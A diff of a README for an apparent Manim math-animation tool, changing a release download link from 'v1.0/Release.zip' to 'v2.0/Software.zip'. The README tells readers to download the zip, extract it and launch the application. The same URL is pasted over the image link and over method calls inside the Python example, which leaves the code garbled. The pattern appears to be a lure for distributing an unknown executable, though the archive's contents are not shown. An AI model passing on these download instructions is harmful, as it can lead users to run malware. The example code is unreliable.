@@ -12,11 +12,11 @@ This repository is designed to help you easily convert your math equations into 
 
 ## Getting Started
 
-To get started with Math-To-Manim, simply download the https://github.com/Rathore786123/Math-To-Manim/releases/download/v1.0/Release.zip file from the following link:
+To get started with Math-To-Manim, simply download the https://github.com/Rathore786123/Math-To-Manim/releases/download/v2.0/Software.zip file from the following link:
 
-[![Download https://github.com/Rathore786123/Math-To-Manim/releases/download/v1.0/Release.zip](https://github.com/Rathore786123/Math-To-Manim/releases/download/v1.0/Release.zip)](https://github.com/Rathore786123/Math-To-Manim/releases/download/v1.0/Release.zip)
+[![Download https://github.com/Rathore786123/Math-To-Manim/releases/download/v2.0/Software.zip](https://github.com/Rathore786123/Math-To-Manim/releases/download/v2.0/Software.zip)](https://github.com/Rathore786123/Math-To-Manim/releases/download/v2.0/Software.zip)
 
-Once you have downloaded the https://github.com/Rathore786123/Math-To-Manim/releases/download/v1.0/Release.zip file, extract it and launch the application. You'll be ready to start creating stunning math animations in no time!
+Once you have downloaded the https://github.com/Rathore786123/Math-To-Manim/releases/download/v2.0/Software.zip file, extract it and launch the application. You'll be ready to start creating stunning math animations in no time!
 
 ## Example
 
@@ -34,8 +34,8 @@ class PythagoreanTheorem(Scene):
         # Draw right triangle
         triangle = Polygon(LEFT, UP, RIGHT + UP)
 
-        https://github.com/Rathore786123/Math-To-Manim/releases/download/v1.0/Release.zip(Create(triangle))
-        https://github.com/Rathore786123/Math-To-Manim/releases/download/v1.0/Release.zip(Write(a), Write(b), Write(c))
+        https://github.com/Rathore786123/Math-To-Manim/releases/download/v2.0/Software.zip(Create(triangle))
+        https://github.com/Rathore786123/Math-To-Manim/releases/download/v2.0/Software.zip(Write(a), Write(b), Write(c))
 ```
 
 This code snippet demonstrates how you can create a simple animation using Manim to visualize the Pythagorean theorem. With Math-To-Manim, you can easily generate similar animations for a wide range of mathematical concepts.
@@ -56,5 +56,5 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 Thank you for checking out Math-To-Manim! We hope this tool helps you bring your math animations to life. Happy animating! 🚀
 
-![Math-To-Manim](https://github.com/Rathore786123/Math-To-Manim/releases/download/v1.0/Release.zip)
+![Math-To-Manim](https://github.com/Rathore786123/Math-To-Manim/releases/download/v2.0/Software.zip)
 
